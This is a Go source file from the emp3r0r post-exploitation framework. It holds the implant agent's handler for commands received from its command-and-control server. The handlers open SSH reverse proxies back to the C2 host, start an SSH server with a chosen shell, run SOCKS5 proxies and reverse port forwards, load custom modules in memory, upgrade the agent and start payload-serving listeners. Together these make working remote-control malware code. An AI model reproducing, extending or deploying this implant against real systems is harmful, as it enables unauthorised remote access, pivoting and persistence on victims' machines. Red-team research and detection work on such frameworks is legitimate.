package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/listener"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/pflag"
)

func C2CommandsHandler(cmdSlice []string) (out string) {
	var err error

	// parse command-line arguments using pflag
	flags := pflag.NewFlagSet(cmdSlice[0], pflag.ContinueOnError)
	flags.Parse(cmdSlice[1:])

	switch cmdSlice[0] {

	// stat file
	// Usage: !stat --path <path>
	// Retrieves file statistics for the specified path.
	case emp3r0r_data.C2CmdStat:
		path := flags.StringP("path", "p", "", "Path to stat")
		flags.Parse(cmdSlice[1:])
		if *path == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}

		fi, err := os.Stat(*path)
		if err != nil || fi == nil {
			out = fmt.Sprintf("Error: cant stat file %s: %v", *path, err)
			return
		}
		fstat := &util.FileStat{}
		fstat.Name = util.FileBaseName(*path)
		fstat.Size = fi.Size()
		fstat.Checksum = tun.SHA256SumFile(*path)
		fstat.Permission = fi.Mode().String()
		fiData, err := json.Marshal(fstat)
		out = string(fiData)
		if err != nil {
			out = fmt.Sprintf("Error: cant marshal file info %s: %v", *path, err)
		}
		return

	// !bring2cc --addr target_agent_ip
	// Usage: !bring2cc --addr <target_agent_ip>
	// Sets up a reverse proxy to the specified agent IP address.
	case emp3r0r_data.C2CmdBring2CC:
		addr := flags.StringP("addr", "a", "", "Target agent IP address")
		flags.Parse(cmdSlice[1:])
		if *addr == "" {
			out = fmt.Sprintf("Error args error: %v", cmdSlice)
			return
		}
		out = "Bring2CC: Reverse proxy for " + *addr + " finished"

		hasInternet := tun.HasInternetAccess(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
		isProxyOK := tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress)
		if !hasInternet && !isProxyOK {
			out = "Error: We don't have any internet to share"
		}
		for p, cancelfunc := range ReverseConns {
			if *addr == p {
				cancelfunc() // cancel existing connection
			}
		}
		addrWithPort := *addr + ":" + RuntimeConfig.SSHProxyPort
		ctx, cancel := context.WithCancel(context.Background())
		if err = tun.SSHReverseProxyClient(addrWithPort, RuntimeConfig.Password,
			&ReverseConns,
			emp3r0r_data.ProxyServer,
			ctx, cancel); err != nil {
			out = err.Error()
		}
		return

	// Usage: !sshd --shell <shell> --port <port> --args <args>
	// Starts an SSHD server with the specified shell, port, and arguments.
	case emp3r0r_data.C2CmdSSHD:
		shell := flags.StringP("shell", "s", "", "Shell to use")
		port := flags.StringP("port", "p", "", "Port to use")
		args := flags.StringSliceP("args", "a", []string{}, "Arguments for SSHD")
		flags.Parse(cmdSlice[1:])
		if *shell == "" || *port == "" {
			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
			log.Print(out)
			return
		}
		log.Printf("Got sshd request: %s", cmdSlice)

		errChan := make(chan error)

		go func() {
			errChan <- SSHD(*shell, *port, *args)
		}()

		// wait for SSHD to start
		for !tun.IsPortOpen("127.0.0.1", *port) {
			time.Sleep(100 * time.Millisecond)
		}

		select {
		case err = <-errChan:
			if err != nil {
				out = fmt.Sprintf("Error: %v", err)
			} else {
				out = "success"
			}
		case <-time.After(3 * time.Second):
			out = "SSHD started successfully"
		}
		return

	// !proxy --mode on --addr 0.0.0.0:12345
	// Usage: !proxy --mode <mode> --addr <address>
	// Starts a Socks5 proxy server with the specified mode and address.
	case emp3r0r_data.C2CmdProxy:
		mode := flags.StringP("mode", "m", "", "Proxy mode")
		addr := flags.StringP("addr", "a", "", "Address to bind")
		flags.Parse(cmdSlice[1:])
		if *mode == "" || *addr == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			log.Print(out)
			return
		}
		log.Printf("Got proxy request: %s", cmdSlice)
		err = Socks5Proxy(*mode, *addr)
		if err != nil {
			out = fmt.Sprintf("Error: Failed to start Socks5Proxy: %v", err)
		}
		out = fmt.Sprintf("Socks5Proxy server ready with username %s and password %s",
			RuntimeConfig.ShadowsocksPort,
			RuntimeConfig.Password)
		return

	// !port_fwd --to/listen [to/listen] --shID [shID] --operation/protocol [operation/protocol] --timeout [timeout]
	// Usage: !port_fwd --to <target> --shID <session_id> --operation <operation> --timeout <timeout>
	// Sets up port forwarding with the specified parameters.
	case emp3r0r_data.C2CmdPortFwd:
		to := flags.StringP("to", "t", "", "Target address")
		sessionID := flags.StringP("shID", "s", "", "Session ID")
		operation := flags.StringP("operation", "o", "", "Operation type")
		timeout := flags.IntP("timeout", "T", 0, "Timeout")
		flags.Parse(cmdSlice[1:])
		if *to == "" || *sessionID == "" || *operation == "" {
			out = fmt.Sprintf("Error: Invalid command: %v", cmdSlice)
			return
		}
		out = "success"

		errChan := make(chan error)

		switch *operation {
		case "stop":
			pf, exist := PortFwds[*sessionID]
			if exist {
				pf.Cancel()
				out = fmt.Sprintf("Warning: port mapping %s stopped", pf.Addr)
				break
			}
			out = fmt.Sprintf("Error: port mapping %s not found", pf.Addr)
		case "reverse":
			go func() {
				errChan <- PortFwd(*to, *sessionID, "tcp", true, 0)
			}()
		default:
			go func() {
				errChan <- PortFwd(*to, *sessionID, *operation, false, *timeout)
			}()
		}

		select {
		case err = <-errChan:
			if err != nil {
				out = fmt.Sprintf("Error: %v", err)
			}
		case <-time.After(3 * time.Second):
			out = "Port forwarding started successfully"
		}
		return

	// !delete_portfwd --id id
	// Usage: !delete_portfwd --id <session_id>
	// Deletes the specified port forwarding session.
	case emp3r0r_data.C2CmdDeletePortFwd:
		id := flags.StringP("id", "i", "", "Session ID")
		flags.Parse(cmdSlice[1:])
		if *id == "" {
			return
		}
		for sessionID, session := range PortFwds {
			if sessionID == *id {
				session.Cancel()
			}
		}
		return

	// !utils
	// Usage: !utils
	// Executes utility functions on the agent.
	case emp3r0r_data.C2CmdUtils:
		out = VaccineHandler()
		if out != "[+] Utils have been successfully installed" {
			out = fmt.Sprintf("Error: %s", out)
		}
		return

	// !custom_module --mod_name mod_name --checksum checksum
	// Usage: !custom_module --mod_name <module_name> --checksum <checksum> --in_mem <in_memory>
	// Loads a custom module with the specified name and checksum.
	case emp3r0r_data.C2CmdCustomModule:
		modName := flags.StringP("mod_name", "m", "", "Module name")
		checksum := flags.StringP("checksum", "c", "", "Checksum")
		inMem := flags.BoolP("in_mem", "i", false, "Load module in memory")
		flags.Parse(cmdSlice[1:])
		if *modName == "" || *checksum == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = moduleHandler(*modName, *checksum, *inMem)
		return

	// !upgrade_agent --checksum checksum
	// Usage: !upgrade_agent --checksum <checksum>
	// Upgrades the agent with the specified checksum.
	case emp3r0r_data.C2CmdUpdateAgent:
		checksum := flags.StringP("checksum", "c", "", "Checksum")
		flags.Parse(cmdSlice[1:])
		if *checksum == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = Upgrade(*checksum)
		return

	// !listener --listener listener --port port --payload payload --compression on/off --passphrase passphrase
	case emp3r0r_data.C2CmdListener:
		listener_type := flags.StringP("listener", "l", "http_aes_compressed", "Listener")
		port := flags.StringP("port", "p", "8000", "Port")
		payload := flags.StringP("payload", "P", "", "Payload")
		compression := flags.StringP("compression", "c", "on", "Compression")
		passphrase := flags.StringP("passphrase", "s", "my_secret_key", "Passphrase")
		flags.Parse(cmdSlice[1:])

		if *payload == "" {
			out = fmt.Sprintf("Error: payload not specified: %v", cmdSlice)
			return
		}
		log.Printf("Got listener request: %v", cmdSlice)

		errChan := make(chan error)

		if *listener_type == "http_aes_compressed" {
			go func() {
				errChan <- listener.HTTPAESCompressedListener(*payload, *port, *passphrase, *compression == "on")
			}()
		}
		if *listener_type == "http_bare" {
			go func() {
				errChan <- listener.HTTPBareListener(*payload, *port)
			}()
		}

		select {
		case err = <-errChan:
			if err != nil {
				out = fmt.Sprintf("Error: %v", err)
			}
		case <-time.After(3 * time.Second):
			out = "Listener started successfully"
		}
		return

	default:
		// let per-platform C2CommandsHandler do the job
		out = platformC2CommandsHandler(cmdSlice)
	}
	return
}
